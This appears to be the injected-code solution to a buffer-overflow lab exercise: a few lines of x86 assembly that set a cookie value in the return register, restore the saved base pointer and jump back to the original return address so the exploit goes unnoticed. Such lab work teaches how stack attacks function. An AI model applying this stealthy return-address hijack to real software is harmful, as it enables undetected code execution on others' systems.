/* 0x08048dd5 is the real return address 
   0x556833b0 is the old real base pointer */
movl $0x5659251b,%eax /* write cookie into return */
movl $0x556833b0,%ebp /* set base pointer to actual one */
push $0x08048dd5 /* push old return address */
ret



